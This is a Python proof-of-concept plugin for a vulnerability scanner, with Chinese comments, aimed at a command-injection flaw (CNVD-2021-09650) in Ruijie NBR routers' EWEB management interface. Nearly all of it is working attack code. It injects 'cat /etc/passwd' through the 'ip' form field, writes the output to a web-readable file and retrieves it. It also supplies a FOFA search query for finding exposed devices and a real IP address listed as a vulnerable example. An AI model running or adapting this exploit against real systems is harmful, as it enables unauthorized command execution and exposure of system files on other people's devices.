# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "2",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            v1:略  
            v2:经huangstts同学指出，第一个版本检测逻辑过于简单，容易产生大量误报，
                该版本进行了逻辑优化，感谢huangstts同学，祝使用愉快  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞",                        # 漏洞名称
        "VulnID" : "CNVD-2021-09650",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "锐捷NBR路由器 EWEB网管系统",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="锐捷网络-EWEB网管系统"
            icon_hash="-692947551"
        """,                     # fofa搜索语句
        "example" : "https://222.169.90.53:4430",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/guest_auth/guestIsUp.php" # url自己按需调整
        url1 = self.target + "/guest_auth/ofx_test.txt"

        data0 = "mac=1&ip=127.0.0.1|cat /etc/passwd > ofx_test.txt"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and len(req0.text) == 0 and req0.headers["Content-Type"] == "text/html":
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and "root::" in req1.text:
                    vuln = [True,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()